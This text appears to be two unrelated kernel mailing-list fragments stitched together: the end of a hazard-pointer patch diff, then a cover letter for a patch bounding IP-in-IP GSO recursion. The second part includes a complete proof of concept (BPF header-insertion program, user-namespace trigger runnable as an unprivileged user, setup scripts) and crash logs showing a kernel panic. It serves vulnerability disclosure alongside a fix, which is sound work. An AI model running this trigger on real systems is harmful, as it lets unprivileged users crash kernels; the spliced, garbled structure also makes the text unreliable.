->+	struct hazptr_percpu_slots *percpu_slots = per_cpu_ptr(&hazptr_percpu_slots, cpu);
->+	unsigned int idx;
->+
->+	for (idx = 0; idx < NR_HAZPTR_PERCPU_SLOTS; idx++) {
->+		struct hazptr_slot_item *item = &percpu_slots->items[idx];
->+
->+		/* Busy-wait if node is found. */
->+		smp_cond_load_acquire(&item->slot.addr, VAL != addr && VAL != HAZPTR_WILDCARD); /* Load B */
->+	}
->+}
->+
->+/*
->+ * hazptr_synchronize: Wait until @addr is released from all slots.
->+ *
->+ * Wait to observe that each slot contains a value that differs from
->+ * @addr before returning.
->+ * Should be called from preemptible context.
->+ */
->+void hazptr_synchronize(void *addr)
->+{
->+	int cpu;
->+
->+	/*
->+	 * Busy-wait should only be done from preemptible context.
->+	 */
->+	lockdep_assert_preemption_enabled();
->+
->+	/*
->+	 * Store A precedes hazptr_scan(): it unpublishes addr (sets it to
->+	 * NULL or to a different value), and thus hides it from hazard
->+	 * pointer readers.
->+	 */
->+	if (!addr)
->+		return;
->+	/* Memory ordering: Store A before Load B. */
->+	smp_mb();
->+	/* Scan all CPUs slots. */
->+	for_each_possible_cpu(cpu) {
->+		struct hazptr_overflow_list_flip *overflow_list_flip = per_cpu_ptr(&percpu_overflow_list_flip, cpu);
->+		unsigned int scan_idx;
->+
->+		/* Scan CPU slots. */
->+		hazptr_synchronize_cpu_slots(cpu, addr);
->+
->+		/*
->+		 * Scan backup slots in percpu overflow lists.
->+		 * Forward progress is guaranteed by scanning one list
->+		 * while new elements are added into the other list.
->+		 */
->+		guard(mutex)(&overflow_list_flip->lock);
->+		scan_idx = overflow_list_flip->add_idx ^ 1;
->+		hazptr_synchronize_overflow_list(&overflow_list_flip->array[scan_idx], addr);
->+		/* Flip current list. */
->+		WRITE_ONCE(overflow_list_flip->add_idx, scan_idx);
->+		hazptr_synchronize_overflow_list(&overflow_list_flip->array[scan_idx ^ 1], addr);
->+	}
->+}
->+EXPORT_SYMBOL_GPL(hazptr_synchronize);
->+
->+struct hazptr_slot *hazptr_chain_backup_slot(struct hazptr_ctx *ctx)
->+{
->+	struct hazptr_overflow_list_flip *overflow_list_flip = this_cpu_ptr(&percpu_overflow_list_flip);
->+	unsigned int list_idx = READ_ONCE(overflow_list_flip->add_idx);
->+	struct hazptr_overflow_list *overflow_list = &overflow_list_flip->array[list_idx];
->+	struct hazptr_slot *slot = &ctx->backup_slot.slot;
->+
->+	slot->addr = NULL;
->+	guard(raw_spinlock_irqsave)(&overflow_list->lock);
->+	overflow_list->gen++;
->+	hlist_add_head(&ctx->backup_slot.overflow_node, &overflow_list->head);
->+	ctx->backup_slot.overflow_list = overflow_list;
->+	return slot;
->+}
->+EXPORT_SYMBOL_GPL(hazptr_chain_backup_slot);
->+
->+void hazptr_unchain_backup_slot(struct hazptr_ctx *ctx)
->+{
->+	struct hazptr_overflow_list *overflow_list = ctx->backup_slot.overflow_list;
->+
->+	guard(raw_spinlock_irqsave)(&overflow_list->lock);
->+	overflow_list->gen++;
->+	hlist_del(&ctx->backup_slot.overflow_node);
->+}
->+EXPORT_SYMBOL_GPL(hazptr_unchain_backup_slot);
->+
->+void __init hazptr_init(void)
->+{
->+	int cpu;
->+
->+	for_each_possible_cpu(cpu) {
->+		struct hazptr_overflow_list_flip *overflow_list_flip = per_cpu_ptr(&percpu_overflow_list_flip, cpu);
->+
->+		mutex_init(&overflow_list_flip->lock);
->+		for (int i = 0; i < 2; i++) {
->+			raw_spin_lock_init(&overflow_list_flip->array[i].lock);
->+			INIT_HLIST_HEAD(&overflow_list_flip->array[i].head);
->+		}
->+	}
->+}
->diff --git a/kernel/sched/core.c b/kernel/sched/core.c
->index f78275192036..b77152edafd9 100644
->--- a/kernel/sched/core.c
->+++ b/kernel/sched/core.c
->@@ -59,6 +59,7 @@
-> #include <linux/profile.h>
-> #include <linux/psi.h>
-> #include <linux/rcuwait_api.h>
->+#include <linux/hazptr.h>
-> #include <linux/rseq.h>
-> #include <linux/sched/wake_q.h>
-> #include <linux/scs.h>
->@@ -7123,6 +7124,7 @@ static void __sched notrace __schedule(int sched_mode)
-> 	local_irq_disable();
-> 	rcu_note_context_switch(preempt);
-> 	migrate_disable_switch(rq, prev);
->+	hazptr_note_context_switch();
-> 
-> 	/*
-> 	 * Make sure that signal_pending_state()->signal_pending() below
->
+Changes in v3:
+  - Treat an exhausted 256-byte budget as a callback-entry failure, including
+    the zero-length check used by the common callback wrapper and IP handlers.
+  - v2 Link: https://lore.kernel.org/all/cover.1789618203.git.zihanx@nebusec.ai/
 
---- Thanks!
-https://lore.kernel.org/all/EE579805-42F2-4C58-B752-F28779EEB717@grrlz.net/
+Changes in v2:
+  - Replace the callback counter with a cumulative 256-byte header budget
+    carried in skb_gso_cb.
+  - Apply the budget at common callback entry and across IP, GRE, UDP,
+    MPLS, NSH, ESP, and IPv6 extension dispatch, including GRE/UDP
+    context resets.
+  - Rebase the UDP hunk onto selected revision c9151088f167 and rerun both
+    IPv4 PoCs; use the decoded crash evidence from unpatched 88c17de85ddb.
+  - v1 Link: https://lore.kernel.org/all/cover.1789302084.git.zihanx@nebusec.ai/
+
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+The detailed bug information, PoC, and decoded crash output are
+included below.
+
+---- details below ----
+
+Bug details:
+
+An IP-in-IP GSO packet reaches skb_mac_gso_segment() and re-enters the
+IPv4 or IPv6 GSO handler for each nested IP header. The encap_level
+only records header bytes; it does not bound callback depth. A deep
+chain can exhaust the kernel stack before a transport GSO callback is
+reached.
+
+The fix initializes gso_header_len in skb_gso_cb for each top-level GSO
+operation and charges header bytes before inner dispatch. The common
+callback wrapper checks the same state, so direct IP re-entry and nested
+tunnel callbacks share one monotonic budget. GRE and UDP encap_level
+resets cannot restart it.
+
+GSO_MAX_HEADER is a practical 256-byte header budget, not a measured
+stack-overflow threshold or an architecture-independent stack-safety proof.
+With no initial offset, 12 minimum-sized IPv4 headers use 240 bytes and the
+next header is rejected. IPv6, extension, and tunnel headers use the budget
+faster. The fixed x86_64 run completed without a stack-guard fault, but it
+does not establish a uniform margin for architectures with smaller stacks.
+
+The IPv4 stackable re-entry mechanism was introduced by
+3347c9602955 ("ipv4: gso: make inet_gso_segment() stackable").
+68c331631143 ("v4 GRE: Add TCP segmentation offload for GRE") predates it,
+and cb32f511a70b ("ipip: add GSO/TSO support") later expanded the reachable
+IP-in-IP path. The IPv6 stackable path was introduced separately by
+d3e5e0062de5 ("ipv6: gso: make ipv6_gso_segment() stackable"). Fixes points
+to 3347c9602955 for the IPv4 root cause.
+
+Reproducer:
+
+BPF/veth path (run as root in the initial user namespace):
+
+    make clean all
+    ./poc.sh
+
+The checked-in Makefile builds poc and tc_mutate.bpf.o. With KDIR
+unset, the BPF command is:
+
+    clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra \
+        -I/usr/include/x86_64-linux-gnu \
+        -DINSERTED_IPS=199 -DTRIGGER_PORT=4242 \
+        -c tc_mutate.bpf.c -o tc_mutate.bpf.o
+
+Runtime needs gcc, clang, iproute2, ethtool, and perl. With no Python 3,
+poc.sh used this actual Perl fallback:
+
+    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
+
+The namespace-only path attempted these setup commands:
+
+    apt-get install -y ethtool
+    cc -O2 -static -g -Wall -Wextra -o poc_privilege_optimized poc_privilege_optimized.c
+
+The guest apt mirror was unavailable, so the final run copied the host
+`/usr/sbin/ethtool` and these runtime files into
+`/usr/local/lib/ethtool-host/`:
+
+    /lib/x86_64-linux-gnu/libmnl.so.0
+    /lib/x86_64-linux-gnu/libm.so.6
+    /lib/x86_64-linux-gnu/libc.so.6
+    /lib64/ld-linux-x86-64.so.2
+
+The wrapper was copied from `verify/ethtool-host-wrapper-public.sh`. Omitting
+only the test harness's SSH identity, port, and host-key options, the copy
+and install commands were:
+
+    ssh root@127.0.0.1 'mkdir -p /usr/local/lib/ethtool-host'
+    scp /usr/sbin/ethtool /lib/x86_64-linux-gnu/libmnl.so.0 \
+        /lib/x86_64-linux-gnu/libm.so.6 /lib/x86_64-linux-gnu/libc.so.6 \
+        /lib64/ld-linux-x86-64.so.2 \
+        root@127.0.0.1:/usr/local/lib/ethtool-host/
+    scp verify/ethtool-host-wrapper-public.sh \
+        root@127.0.0.1:/usr/local/lib/ethtool-host/ethtool-wrapper
+    ssh root@127.0.0.1 \
+        'chmod 755 /usr/local/lib/ethtool-host/ethtool-wrapper; \
+         ln -sf /usr/local/lib/ethtool-host/ethtool-wrapper /usr/sbin/ethtool'
+
+The run then launched the trigger as UID 65534 with:
+
+    su -s /bin/sh nobody -c 'cd /tmp/q7x-ns && exec ./poc_privilege_optimized.sh 180 1400'
+
+The private user namespace maps it to UID 0. Packetdrill is not used
+because the trigger needs network namespaces, IPIP devices, tc egress BPF
+header insertion, and UDP_SEGMENT control data, which cannot be expressed
+as a packetdrill packet sequence.
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+The v3 fixed kernel build using
+43510074c063f57e5738ecc55057e7fbbcdb1fbc returned BUILD_RC=0. The fixed
+BPF/veth run used the Perl fallback, sent 65536 bytes, and returned
+REMOTE_RC=0 and DMESG_RC=0. The fixed namespace-only run was launched as
+UID 65534 with depth 180 and gso_size 1400; it sent a 3676-byte payload,
+returned 3676 from sendmsg(), and returned REMOTE_RC=0 and DMESG_RC=0.
+Neither fixed run showed a crash marker.
+
+REMOTE_RC=0 means normal completion. REMOTE_RC=124 means the host-side
+timeout expired. The unpatched runs returned REMOTE_RC=255 (and
+DMESG_RC=255 for BPF) after the guest became unreachable; these are
+wrapper statuses, not kernel
+error codes.
+
+------BEGIN Makefile------
+CC ?= gcc
+CLANG ?= clang
+KDIR ?=
+BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra -I/usr/include/x86_64-linux-gnu $(if $(KDIR),-I$(KDIR)/tools/lib/bpf)
+CFLAGS ?= -O2 -Wall -Wextra
+INSERTED_IPS ?= 199
+TRIGGER_PORT ?= 4242
+
+all: poc tc_mutate.bpf.o
+
+poc: poc.c
+	$(CC) $(CFLAGS) -o $@ $<
+
+tc_mutate.bpf.o: tc_mutate.bpf.c
+	$(CLANG) $(BPF_CFLAGS) -DINSERTED_IPS=$(INSERTED_IPS) -DTRIGGER_PORT=$(TRIGGER_PORT) -c -o $@ $<
+
+clean:
+	rm -f poc tc_mutate.bpf.o
+------END Makefile--------
+
+------BEGIN net-server-perl.sh------
+#!/bin/sh
+exec perl -MIO::Socket::INET -e 'my $s = IO::Socket::INET->new(LocalAddr => "198.18.0.2", LocalPort => 4242, Listen => 1, ReuseAddr => 1) or die "server: $!\n"; my $c = $s->accept() or die "accept: $!\n"; my $buf; while (read($c, $buf, 65536)) {}'------END net-server-perl.sh--------
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+static void usage(const char *prog)
+{
+	fprintf(stderr, "Usage: %s <ip> <port> <bytes>\n", prog);
+}
+
+int main(int argc, char **argv)
+{
+	struct sockaddr_in addr;
+	char *buf;
+	unsigned long port;
+	unsigned long total;
+	size_t off = 0;
+	int one = 1;
+	int fd;
+
+	if (argc != 4) {
+		usage(argv[0]);
+		return 1;
+	}
+
+	port = strtoul(argv[2], NULL, 0);
+	total = strtoul(argv[3], NULL, 0);
+	if (port > 65535 || total == 0) {
+		fprintf(stderr, "invalid port or byte count\n");
+		return 1;
+	}
+
+	buf = malloc(total);
+	if (!buf) {
+		perror("malloc");
+		return 1;
+	}
+	for (off = 0; off < total; off++)
+		buf[off] = 'A' + (off % 23);
+
+	fd = socket(AF_INET, SOCK_STREAM, 0);
+	if (fd < 0) {
+		perror("socket");
+		free(buf);
+		return 1;
+	}
+
+	if (setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0) {
+		perror("setsockopt(TCP_NODELAY)");
+		close(fd);
+		free(buf);
+		return 1;
+	}
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons((uint16_t)port);
+	if (inet_pton(AF_INET, argv[1], &addr.sin_addr) != 1) {
+		fprintf(stderr, "invalid IPv4 address\n");
+		close(fd);
+		free(buf);
+		return 1;
+	}
+
+	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+		perror("connect");
+		close(fd);
+		free(buf);
+		return 1;
+	}
+
+	off = 0;
+	while (off < total) {
+		ssize_t n = send(fd, buf + off, total - off, 0);
+
+		if (n < 0) {
+			perror("send");
+			close(fd);
+			free(buf);
+			return 1;
+		}
+		off += (size_t)n;
+	}
+
+	fprintf(stderr, "sent %lu bytes to %s:%lu\n", total, argv[1], port);
+	close(fd);
+	free(buf);
+	return 0;
+}
+------END poc.c--------
+
+------BEGIN poc.sh------
+#!/bin/sh
+set -eu
+
+DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+
+NS=${NS:-q7xns}
+OUTER_DEV0=${OUTER_DEV0:-q7xveth0}
+OUTER_DEV1=${OUTER_DEV1:-q7xveth1}
+OUTER0=${OUTER0:-10.10.0.1/24}
+OUTER1=${OUTER1:-10.10.0.2/24}
+OUTER0_IP=${OUTER0_IP:-10.10.0.1}
+OUTER1_IP=${OUTER1_IP:-10.10.0.2}
+TUN0=${TUN0:-q7xipip0}
+TUN1=${TUN1:-q7xipip1}
+INNER0_IP=${INNER0_IP:-198.18.0.1}
+INNER1_IP=${INNER1_IP:-198.18.0.2}
+TARGET_IP=${TARGET_IP:-198.18.0.2}
+PORT=${PORT:-4242}
+SEND_BYTES=${SEND_BYTES:-65536}
+SERVER_PIDFILE=/tmp/q7x-server.pid
+
+cleanup() {
+	tc qdisc del dev "$OUTER_DEV0" clsact 2>/dev/null || true
+	ip link del "$TUN0" 2>/dev/null || true
+	ip netns del "$NS" 2>/dev/null || true
+	ip link del "$OUTER_DEV0" 2>/dev/null || true
+	rm -f "$SERVER_PIDFILE"
+}
+
+trap cleanup EXIT
+
+gcc -O2 -Wall -Wextra -o "$DIR/poc" "$DIR/poc.c"
+if [ ! -f "$DIR/tc_mutate.bpf.o" ]; then
+	echo "missing tc_mutate.bpf.o; build it on the host with: make -C $DIR" >&2
+	exit 1
+fi
+
+cleanup
+
+ip netns add "$NS"
+ip link add "$OUTER_DEV0" type veth peer name "$OUTER_DEV1"
+ip link set "$OUTER_DEV1" netns "$NS"
+
+ip addr add "$OUTER0" dev "$OUTER_DEV0"
+ip link set "$OUTER_DEV0" up
+ip netns exec "$NS" ip addr add "$OUTER1" dev "$OUTER_DEV1"
+ip netns exec "$NS" ip link set lo up
+ip netns exec "$NS" ip link set "$OUTER_DEV1" up
+
+ethtool -K "$OUTER_DEV0" tso off gso off gro off sg off >/dev/null 2>&1 || true
+
+ip link add "$TUN0" type ipip local "$OUTER0_IP" remote "$OUTER1_IP" dev "$OUTER_DEV0"
+ip addr add "$INNER0_IP" peer "$INNER1_IP" dev "$TUN0"
+ip link set "$TUN0" up
+
+ip netns exec "$NS" ip link add "$TUN1" type ipip local "$OUTER1_IP" remote "$OUTER0_IP" dev "$OUTER_DEV1"
+ip netns exec "$NS" ip addr add "$INNER1_IP" peer "$INNER0_IP" dev "$TUN1"
+ip netns exec "$NS" ip link set "$TUN1" up
+
+tc qdisc add dev "$OUTER_DEV0" clsact
+tc filter add dev "$OUTER_DEV0" egress bpf da obj "$DIR/tc_mutate.bpf.o" sec tc
+
+if command -v python3 >/dev/null 2>&1; then
+    ip netns exec "$NS" python3 - <<'PY' &
+import socket
+import sys
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("198.18.0.2", 4242))
+s.listen(1)
+conn, _ = s.accept()
+while conn.recv(65535):
+    pass
+PY
+else
+    echo "using Perl listener: $DIR/net-server-perl.sh" >&2
+    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
+fi
+echo $! > "$SERVER_PIDFILE"
+sleep 1
+
+"$DIR/poc" "$TARGET_IP" "$PORT" "$SEND_BYTES"
+sleep 2
+------END poc.sh--------
+
+------BEGIN tc_mutate.bpf.c------
+#include <linux/bpf.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/pkt_cls.h>
+#include <linux/tcp.h>
+#include <stddef.h>
+
+#ifndef INSERTED_IPS
+#define INSERTED_IPS 199
+#endif
+
+#ifndef TRIGGER_PORT
+#define TRIGGER_PORT 4242
+#endif
+
+#ifndef IP_DF
+#define IP_DF 0x4000
+#endif
+
+#ifndef IPPROTO_IPIP
+#define IPPROTO_IPIP 4
+#endif
+
+#ifndef IPPROTO_TCP
+#define IPPROTO_TCP 6
+#endif
+
+#define SEC(NAME) __attribute__((section(NAME), used))
+#define bpf_htons(x) ((__be16)__builtin_bswap16((__u16)(x)))
+#define bpf_ntohs(x) ((__u16)__builtin_bswap16((__u16)(x)))
+#define bpf_htonl(x) ((__be32)__builtin_bswap32((__u32)(x)))
+
+#define INSERTED_LEN (INSERTED_IPS * (__u32)sizeof(struct iphdr))
+
+static long (*bpf_skb_load_bytes)(struct __sk_buff *skb, __u32 off,
+				  void *to, __u32 len) =
+	(void *)BPF_FUNC_skb_load_bytes;
+static long (*bpf_skb_adjust_room)(struct __sk_buff *skb, __s32 len_diff,
+				   __u32 mode, __u64 flags) =
+	(void *)BPF_FUNC_skb_adjust_room;
+static long (*bpf_skb_store_bytes)(struct __sk_buff *skb, __u32 off,
+				   const void *from, __u32 len,
+				   __u64 flags) =
+	(void *)BPF_FUNC_skb_store_bytes;
+static long (*bpf_l3_csum_replace)(struct __sk_buff *skb, __u32 off,
+				   __u64 from, __u64 to, __u64 size) =
+	(void *)BPF_FUNC_l3_csum_replace;
+
+static __always_inline int load_bytes(struct __sk_buff *skb, __u32 off,
+				      void *dst, __u32 len)
+{
+	return bpf_skb_load_bytes(skb, off, dst, len);
+}
+
+SEC("tc")
+int mutate_gso_chain(struct __sk_buff *skb)
+{
+	struct iphdr outer;
+	struct iphdr inner;
+	struct tcphdr th;
+	__u32 off = sizeof(struct ethhdr);
+	__u32 ins_off = off + sizeof(struct iphdr);
+	__u16 new_tot;
+	int i;
+
+	if (skb->protocol != bpf_htons(ETH_P_IP))
+		return TC_ACT_OK;
+	if (skb->len < 2000)
+		return TC_ACT_OK;
+	if (load_bytes(skb, off, &outer, sizeof(outer)) < 0)
+		return TC_ACT_OK;
+	if (outer.version != 4 || outer.ihl != 5 || outer.protocol != IPPROTO_IPIP)
+		return TC_ACT_OK;
+	if (load_bytes(skb, ins_off, &inner, sizeof(inner)) < 0)
+		return TC_ACT_OK;
+	if (inner.version != 4 || inner.ihl != 5 || inner.protocol != IPPROTO_TCP)
+		return TC_ACT_OK;
+	if (load_bytes(skb, ins_off + sizeof(inner), &th, sizeof(th)) < 0)
+		return TC_ACT_OK;
+	if (th.dest != bpf_htons(TRIGGER_PORT))
+		return TC_ACT_OK;
+	if (bpf_skb_adjust_room(skb, INSERTED_LEN, BPF_ADJ_ROOM_NET,
+				BPF_F_ADJ_ROOM_FIXED_GSO |
+				BPF_F_ADJ_ROOM_NO_CSUM_RESET) < 0)
+		return TC_ACT_SHOT;
+
+	new_tot = bpf_htons(bpf_ntohs(outer.tot_len) + INSERTED_LEN);
+	bpf_l3_csum_replace(skb, off + offsetof(struct iphdr, check),
+			    outer.tot_len, new_tot, sizeof(new_tot));
+	bpf_skb_store_bytes(skb, off + offsetof(struct iphdr, tot_len),
+			    &new_tot, sizeof(new_tot), 0);
+
+	for (i = 0; i < INSERTED_IPS; i++) {
+		struct iphdr iph = {};
+
+		iph.version = 4;
+		iph.ihl = 5;
+		iph.ttl = 64;
+		iph.protocol = IPPROTO_IPIP;
+		iph.frag_off = bpf_htons(IP_DF);
+		iph.id = bpf_htons((__u16)(i + 1));
+		iph.saddr = bpf_htonl(0x0a010001u + (__u32)i);
+		iph.daddr = bpf_htonl(0x0a020001u + (__u32)i);
+
+		if (bpf_skb_store_bytes(skb,
+					ins_off + ((__u32)i * sizeof(struct iphdr)),
+					&iph, sizeof(iph), 0) < 0)
+			return TC_ACT_SHOT;
+	}
+
+	return TC_ACT_OK;
+}
+
+char _license[] SEC("license") = "GPL";
+------END tc_mutate.bpf.c--------
+
+------BEGIN poc_privilege_optimized.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/udp.h>
+#include <netinet/in.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef UDP_SEGMENT
+#define UDP_SEGMENT 103
+#endif
+#ifndef SOL_UDP
+#define SOL_UDP 17
+#endif
+
+struct ipv4_min {
+	uint8_t version_ihl;
+	uint8_t tos;
+	uint16_t tot_len;
+	uint16_t id;
+	uint16_t frag_off;
+	uint8_t ttl;
+	uint8_t protocol;
+	uint16_t check;
+	uint32_t saddr;
+	uint32_t daddr;
+} __attribute__((packed));
+
+static void fill_ipip(struct ipv4_min *iph, unsigned int id, uint8_t protocol)
+{
+	memset(iph, 0, sizeof(*iph));
+	iph->version_ihl = 0x45;
+	iph->tot_len = htons(sizeof(*iph)); /* parser does not use this field */
+	iph->id = htons((uint16_t)id);
+	iph->ttl = 64;
+	iph->protocol = protocol;
+	iph->saddr = htonl(0x0a000001U);
+	iph->daddr = htonl(0x0a000002U);
+}
+
+int main(int argc, char **argv)
+{
+	struct sockaddr_in bind_addr = { .sin_family = AF_INET };
+	struct sockaddr_in dst = { .sin_family = AF_INET };
+	struct msghdr msg = {0};
+	struct iovec iov;
+	unsigned char control[CMSG_SPACE(sizeof(uint16_t))];
+	struct cmsghdr *cm;
+	unsigned char *payload;
+	unsigned int depth, segsz, payload_len, i;
+	ssize_t ret;
+	int fd;
+
+	if (argc != 5) {
+		fprintf(stderr, "usage: %s DEST PORT DEPTH GSO_SIZE\n", argv[0]);
+		return 2;
+	}
+	depth = strtoul(argv[3], NULL, 0);
+	segsz = strtoul(argv[4], NULL, 0);
+	if (depth < 1 || depth > 3000 || segsz < 1 || segsz > 65535) {
+		fprintf(stderr, "invalid depth or GSO size\n");
+		return 2;
+	}
+
+	/*
+	 * After tc changes the original inner IPv4 protocol UDP -> IPIP,
+	 * the 8-byte UDP header and payload[0..11] are parsed as an IPv4
+	 * header.  Source port 0x4500 supplies version=4, IHL=5.  payload[1]
+	 * supplies protocol=IPIP.  The explicit headers start at payload+12.
+	 */
+	payload_len = 12 + depth * sizeof(struct ipv4_min) + 64;
+	if (payload_len > 65507) {
+		fprintf(stderr, "payload too large: %u\n", payload_len);
+		return 2;
+	}
+	payload = calloc(1, payload_len);
+	if (!payload) {
+		perror("calloc");
+		return 1;
+	}
+	payload[0] = 64;
+	payload[1] = IPPROTO_IPIP;
+	for (i = 0; i < depth; i++)
+		fill_ipip((struct ipv4_min *)(payload + 12 + i * 20), i,
+			  i + 1 == depth ? IPPROTO_UDP : IPPROTO_IPIP);
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0) {
+		perror("socket");
+		return 1;
+	}
+	bind_addr.sin_port = htons(0x4500);
+	bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
+		perror("bind(0x4500)");
+		return 1;
+	}
+	if (inet_pton(AF_INET, argv[1], &dst.sin_addr) != 1) {
+		fprintf(stderr, "bad destination\n");
+		return 2;
+	}
+	dst.sin_port = htons((uint16_t)strtoul(argv[2], NULL, 0));
+
+	iov.iov_base = payload;
+	iov.iov_len = payload_len;
+	msg.msg_name = &dst;
+	msg.msg_namelen = sizeof(dst);
+	msg.msg_iov = &iov;
+	msg.msg_iovlen = 1;
+	msg.msg_control = control;
+	msg.msg_controllen = sizeof(control);
+	memset(control, 0, sizeof(control));
+	cm = CMSG_FIRSTHDR(&msg);
+	cm->cmsg_level = SOL_UDP;
+	cm->cmsg_type = UDP_SEGMENT;
+	cm->cmsg_len = CMSG_LEN(sizeof(uint16_t));
+	*(uint16_t *)CMSG_DATA(cm) = (uint16_t)segsz;
+
+	fprintf(stderr, "uid=%u euid=%u send UDP_SEGMENT payload=%u depth=%u gso_size=%u source_port=0x4500\n",
+		(unsigned)getuid(), (unsigned)geteuid(), payload_len, depth, segsz);
+	ret = sendmsg(fd, &msg, 0);
+	if (ret < 0) {
+		fprintf(stderr, "sendmsg: %s (%d)\n", strerror(errno), errno);
+		return 1;
+	}
+	fprintf(stderr, "sendmsg returned %zd\n", ret);
+	close(fd);
+	free(payload);
+	return ret == (ssize_t)payload_len ? 0 : 1;
+}
+------END poc_privilege_optimized.c--------
+
+------BEGIN poc_privilege_optimized.sh------
+#!/bin/sh
+set -eu
+
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+export PATH
+
+DEPTH=${1:-180}
+GSO_SIZE=${2:-4096}
+
+echo "launcher uid=$(id -u) gid=$(id -g)"
+echo "status before unshare: $(awk '/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}' /proc/self/status)"
+
+exec unshare --user --map-root-user --net sh -eu -c '
+	echo "inside uid=$(id -u) gid=$(id -g)"
+	echo "uid_map: $(tr "\n" ";" </proc/self/uid_map)"
+	echo "gid_map: $(tr "\n" ";" </proc/self/gid_map)"
+	echo "status: $(awk '\''/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}'\'' /proc/self/status)"
+
+	ip link add q7dummy type dummy
+	ip addr add 10.23.0.1/32 dev q7dummy
+	ip link set q7dummy up
+	ip route add 10.23.0.2/32 dev q7dummy
+
+	ip link add q7tun type ipip local 10.23.0.1 remote 10.23.0.2 dev q7dummy
+	ip addr add 198.18.7.1 peer 198.18.7.2 dev q7tun
+	ip link set q7tun up
+
+	# Make segmentation happen in software after the egress action.  Offset 29
+	# is the protocol byte of the original inner IPv4 header (20 + 9).
+	ethtool -K q7dummy tso off gso off gro off sg off \
+		tx-ipxip4-segmentation off tx-udp-segmentation off
+	tc qdisc add dev q7dummy clsact
+	tc filter add dev q7dummy egress protocol ip pref 1 matchall \
+		action pedit munge offset 29 u8 set 4
+
+	./poc_privilege_optimized 198.18.7.2 9000 "$1" "$2"
+' sh "$DEPTH" "$GSO_SIZE"
+------END poc_privilege_optimized.sh--------
+
+
+The crash log excerpts below are copied from the unpatched namespace-only
+and BPF/veth runs on 88c17de85ddb. Both were decoded with
+scripts/decode_stacktrace.sh using the matching unpatched vmlinux;
+each label identifies the corresponding run.
+
+----BEGIN crash log----
+[namespace-only, UID 65534, unpatched 88c17de85ddb]
+[   11.336820] BUG: TASK stack guard page was hit at ffff9ab440aebff8 (stack is ffff9ab440aec000..ffff9ab440af0000)
+[   11.336823] Oops: stack guard page: 0000 [#1] SMP NOPTI
+[   11.336825] CPU: 0 UID: 65534 PID: 403 Comm: poc_privilege_o Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
+[   11.336826] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   11.336827] RIP: 0010:skb_copy_bits (net/core/skbuff.c:3061)
+[   11.336869] Call Trace:
+[   11.336882]  <TASK>
+[   11.336884]  __pskb_pull_tail (net/core/skbuff.c:2892 (discriminator 2))
+[   11.336885]  ? skb_copy_bits (net/core/skbuff.c:3061)
+[   11.336886]  inet_gso_segment (include/linux/skbuff.h:2873 (discriminator 1) include/linux/skbuff.h:2882 (discriminator 1) net/ipv4/af_inet.c:1379 (discriminator 1))
+[   11.336889]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336891]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336892]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336893]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336894]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336896]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336897]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336898]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336899]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336901]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336902]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336903]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.337200] Kernel panic - not syncing: Fatal exception in interrupt
+
+[BPF/veth, unpatched 88c17de85ddb]
+[   18.344957] BUG: TASK stack guard page was hit at ffff9d2180bb3fe8 (stack is ffff9d2180bb4000..ffff9d2180bb8000)
+[   18.344962] Oops: stack guard page: 0000 [#1] SMP NOPTI
+[   18.344964] CPU: 1 UID: 0 PID: 433 Comm: poc Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
+[   18.344966] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   18.344967] RIP: 0010:inet_gso_segment (net/ipv4/af_inet.c:1404 (discriminator 1))
+[   18.345011] CR2: ffff9d2180bb3fe8 CR3: 000000000dcd8003 CR4: 0000000000370ef0
+[   18.345012] Call Trace:
+[   18.345035]  <TASK>
+[   18.345036]  inet_gso_segment (net/ipv4/af_inet.c:1411)
